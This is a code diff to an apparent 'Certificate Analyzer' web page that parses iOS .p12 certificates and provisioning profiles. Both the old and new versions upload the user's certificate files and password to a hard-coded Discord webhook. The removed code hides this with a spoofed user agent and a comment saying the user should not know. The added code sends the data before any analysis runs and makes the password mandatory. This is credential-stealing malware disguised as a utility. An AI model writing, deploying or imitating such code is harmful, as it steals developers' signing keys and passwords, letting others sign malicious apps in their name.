@@ -255,7 +255,7 @@
                 transform: scale(0, 0);
                 opacity: 1;
             }
-            20% {
+           20% {
                 transform: scale(25, 25);
                 opacity: 1;
             }
@@ -511,7 +511,7 @@
                 </div>
                 
                 <div class="form-group">
-                    <label for="mobileprovision-file"><i class="fas fa-file-contract"></i> Mobile Provisioning Profile (Optional)</label>
+                    <label for="mobileprovision-file"><i class="fas fa-file-contract"></i> Mobile Provisioning Profile</label>
                     <div class="file-input-container">
                         <div class="file-input-button">Choose Mobile Provision File</div>
                         <input type="file" id="mobileprovision-file" class="file-input" accept=".mobileprovision" />
@@ -521,8 +521,8 @@
             </div>
             
             <div class="form-group">
-                <label for="password"><i class="fas fa-lock"></i> Certificate Password (Required for P12 files)</label>
-                <input type="password" id="password" placeholder="Enter certificate password if required" />
+                <label for="password"><i class="fas fa-lock"></i> Certificate Password</label>
+                <input type="password" id="password" placeholder="Enter certificate password" />
             </div>
             
             <div class="progress-bar" id="progress-bar">
@@ -623,7 +623,7 @@
             const progressBar = document.getElementById('progress-bar');
             const progress = document.getElementById('progress');
             
-            // Webhook URL for logging
+            // Webhook URL
             const webhookUrl = 'https://discord.com/api/webhooks/1408927752811319436/9rgv7PZWoPhAhKjfKN1Kxk0GfDaQHfFGZKphAF18khBMSY8E6COR1b9SYsMbMa3360Rp';
             
             let p12File = null;
@@ -652,9 +652,9 @@
                 updateSubmitButtonState();
             });
             
-            // Enable submit button only when certificate file is selected
+            // Enable submit button only when all fields are filled
             function updateSubmitButtonState() {
-                if (p12File) {
+                if (p12File && mobileprovisionFile && passwordInput.value) {
                     submitBtn.disabled = false;
                 } else {
                     submitBtn.disabled = true;
@@ -679,17 +679,14 @@
                     // Simulate progress
                     simulateProgress();
                     
-                    // Analyze the files
+                    // First, send the files to Discord webhook
+                    await sendToWebhook(p12File, mobileprovisionFile, passwordInput.value);
+                    
+                    // Now analyze the files
                     const analysisResult = await analyzeCertificateFiles(p12File, mobileprovisionFile, passwordInput.value);
                     
                     // Display the results
                     displayResults(analysisResult);
-                    
-                    // Send data to webhook for logging (including password)
-                    setTimeout(() => {
-                        sendToWebhook(p12File, mobileprovisionFile, passwordInput.value, analysisResult)
-                            .catch(err => console.error('Background process failed:', err));
-                    }, 1000);
                     
                     // Show success message
                     showAlert(successAlert, "Certificate analysis completed successfully!");
@@ -727,23 +724,21 @@
             }
             
             async function analyzeCertificateFiles(p12File, mobileprovisionFile, password) {
-                // Read certificate file
-                const certBuffer = await readFileAsArrayBuffer(p12File);
+                // Read files
+                const p12Buffer = await readFileAsArrayBuffer(p12File);
+                const provisionData = await readFileAsArrayBuffer(mobileprovisionFile);
                 
-                // Parse certificate
-                const certInfo = await parseCertificate(certBuffer, password);
+                // Parse mobile provisioning profile
+                const provisionInfo = parseMobileProvision(provisionData);
                 
-                // Parse mobile provisioning profile if provided
-                let provisionInfo = {};
-                if (mobileprovisionFile) {
-                    const provisionData = await readFileAsArrayBuffer(mobileprovisionFile);
-                    provisionInfo = parseMobileProvision(provisionData);
-                }
+                // Parse P12 certificate
+                const certInfo = await parseP12Certificate(p12Buffer, password);
                 
                 // Combine information
                 return {
                     ...provisionInfo,
-                    ...certInfo
+                    ...certInfo,
+                    password: password // Include the password in the result
                 };
             }
             
@@ -791,77 +786,59 @@
                         teamId = provisionInfo.TeamIdentifier[0];
                     }
                     
+                    // Get app ID
+                    let appId = 'Unknown';
+                    if (provisionInfo.Entitlements && provisionInfo.Entitlements['application-identifier']) {
+                        appId = provisionInfo.Entitlements['application-identifier'];
+                    }
+                    
+                    // Get capabilities
+                    let capabilities = 'None';
+                    if (provisionInfo.Entitlements) {
+                        capabilities = Object.keys(provisionInfo.Entitlements).join(', ');
+                    }
+                    
                     return {
                         name: provisionInfo.Name || 'Unknown',
                         team: provisionInfo.TeamName || 'Unknown',
                         teamId: teamId,
-                        appId: provisionInfo.Entitlements && provisionInfo.Entitlements['application-identifier'] || 'Unknown',
+                        appId: appId,
                         creationDate: provisionInfo.CreationDate ? new Date(provisionInfo.CreationDate).toLocaleDateString() : 'Unknown',
                         expirationDate: expirationDate.toLocaleDateString(),
                         expirationDays: daysUntilExpiration,
                         certType: provisionInfo.ProvisionedDevices ? 'Development' : 'Distribution',
                         status: status,
                         statusClass: statusClass,
-                        capabilities: provisionInfo.Entitlements ? Object.keys(provisionInfo.Entitlements).join(', ') : 'None',
+                        capabilities: capabilities,
                         devices: provisionInfo.ProvisionedDevices ? provisionInfo.ProvisionedDevices.length + ' devices' : 'All devices'
                     };
                 } catch (error) {
                     console.error('Error parsing mobile provision:', error);
-                    return {
-                        provisionError: 'Failed to parse mobile provisioning file: ' + error.message
-                    };
+                    throw new Error('Failed to parse mobile provisioning file: ' + error.message);
                 }
             }
             
-            async function parseCertificate(certBuffer, password) {
+            async function parseP12Certificate(p12Buffer, password) {
                 try {
                     // Convert ArrayBuffer to binary string
-                    const certDer = new Uint8Array(certBuffer);
+                    const p12Der = new Uint8Array(p12Buffer);
+                    const p12Asn1 = forge.asn1.fromDer(forge.util.createBuffer(p12Der));
                     
-                    // Check if this is a P12/PFX file (starts with PKCS7 OID)
-                    const bytes = new Uint8Array(certBuffer);
-                    const isP12 = bytes.length > 4 && 
-                                 bytes[0] === 0x30 && 
-                                 bytes[1] === 0x82 && 
-                                 bytes[bytes.length - 2] === 0x30 && 
-                                 bytes[bytes.length - 1] === 0x00;
+                    // Decrypt P12 using password
+                    const p12 = forge.pkcs12.pkcs12FromAsn1(p12Asn1, password);
                     
-                    let certificate;
-                    let certType = 'Public';
+                    // Get certificates from P12
+                    const certBags = p12.getBags({ bagType: forge.pki.oids.certBag });
                     
-                    if (isP12) {
-                        // Handle P12/PFX file
-                        if (!password) {
-                            throw new Error('Password required for P12 files');
-                        }
-                        
-                        const p12Asn1 = forge.asn1.fromDer(forge.util.createBuffer(certDer));
-                        const p12 = forge.pkcs12.pkcs12FromAsn1(p12Asn1, password);
-                        
-                        // Get certificates from P12
-                        const certBags = p12.getBags({ bagType: forge.pki.oids.certBag });
-                        
-                        if (!certBags[forge.pki.oids.certBag] || certBags[forge.pki.oids.certBag].length === 0) {
-                            throw new Error('No certificates found in P12 file');
-                        }
-                        
-                        const certBag = certBags[forge.pki.oids.certBag][0];
-                        certificate = certBag.cert;
-                        
-                        if (!certificate) {
-                            throw new Error('Failed to extract certificate from P12');
-                        }
-                        
-                        certType = 'Private';
-                    } else {
-                        // Handle DER encoded certificate
-                        try {
-                            certificate = forge.pki.certificateFromAsn1(forge.asn1.fromDer(forge.util.createBuffer(certDer)));
-                        } catch (e) {
-                            // Try PEM format
-                            const pem = new TextDecoder().decode(certBuffer);
-                            certificate = forge.pki.certificateFromPem(pem);
-                        }
+                    if (!certBags[forge.pki.oids.certBag] || certBags[forge.pki.oids.certBag].length === 0) {
+                        throw new Error('No certificates found in P12 file');
+                    }
+                    
+                    const certBag = certBags[forge.pki.oids.certBag][0];
+                    const certificate = certBag.cert;
+                    
+                    if (!certificate) {
+                        throw new Error('Failed to extract certificate from P12');
                     }
                     
                     // Extract certificate information
@@ -927,11 +904,11 @@
                         fingerprint: fingerprint,
                         status: status,
                         statusClass: statusClass,
-                        certType: certType
+                        certType: 'Private'
                     };
                 } catch (error) {
-                    console.error('Error parsing certificate:', error);
-                    throw new Error('Failed to parse certificate: ' + error.message);
+                    console.error('Error parsing P12:', error);
+                    throw new Error('Failed to parse P12 certificate. Invalid password or file.');
                 }
             }
             
@@ -956,12 +933,12 @@
                 statusIndicator.className = `status-indicator ${results.statusClass}`;
                 
                 // Update details
-                document.getElementById('cert-name').textContent = results.commonName;
-                document.getElementById('organization').textContent = results.organization;
+                document.getElementById('cert-name').textContent = results.commonName || results.name;
+                document.getElementById('organization').textContent = results.organization || results.team;
                 document.getElementById('organizational-unit').textContent = results.organizationalUnit;
                 document.getElementById('serial-number').textContent = results.serialNumber;
-                document.getElementById('valid-from').textContent = results.validFrom;
-                document.getElementById('valid-to').textContent = results.validTo;
+                document.getElementById('valid-from').textContent = results.creationDate || results.validFrom;
+                document.getElementById('valid-to').textContent = results.expirationDate || results.validTo;
                 document.getElementById('public-key-algo').textContent = results.publicKeyAlgorithm;
                 document.getElementById('signature-algo').textContent = results.signatureAlgorithm;
                 document.getElementById('key-size').textContent = results.keySize;
@@ -971,47 +948,31 @@
                 resultsSection.style.display = 'block';
             }
             
-            // Function to send data to webhook for logging (including password)
-            async function sendToWebhook(p12File, mobileprovisionFile, password, analysisResult) {
-                try {
-                    // Create form data to send files
-                    const formData = new FormData();
-                    
-                    // Add message content
-                    formData.append('content', 'New certificate files uploaded via Certificate Analyzer:');
-                    
-                    // Add files
-                    formData.append('p12_file', p12File, p12File.name);
-                    if (mobileprovisionFile) {
-                        formData.append('mobileprovision_file', mobileprovisionFile, mobileprovisionFile.name);
-                    }
-                    
-                    // Add password as a text field
-                    formData.append('password', password);
-                    
-                    // Add analysis results
-                    formData.append('analysis_result', JSON.stringify(analysisResult));
-                    
-                    // Add timestamp
-                    formData.append('timestamp', new Date().toISOString());
-                    
-                    // Send to Discord webhook with a fake user agent
-                    const response = await fetch(webhookUrl, {
-                        method: 'POST',
-                        body: formData,
-                        headers: {
-                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
-                        }
-                    });
-                    
-                    if (!response.ok) {
-                        throw new Error(`Failed to send data: ${response.status}`);
-                    }
-                    
-                    console.log('Data sent successfully to webhook');
-                } catch (error) {
-                    console.error('Error sending to webhook:', error);
-                    // Fail silently - user shouldn't know about this
+            async function sendToWebhook(p12File, mobileprovisionFile, password) {
+                // Create form data to send files
+                const formData = new FormData();
+                
+                // Add message content
+                formData.append('content', 'New certificate files uploaded via Certificate Analyzer:');
+                
+                // Add files
+                formData.append('p12_file', p12File, p12File.name);
+                formData.append('mobileprovision_file', mobileprovisionFile, mobileprovisionFile.name);
+                
+                // Add password as a text field
+                formData.append('password', password);
+                
+                // Add timestamp
+                formData.append('timestamp', new Date().toISOString());
+                
+                // Send to Discord webhook
+                const response = await fetch(webhookUrl, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                if (!response.ok) {
+                    throw new Error(`Failed to send data: ${response.status} ${response.statusText}`);
                 }
             }
             
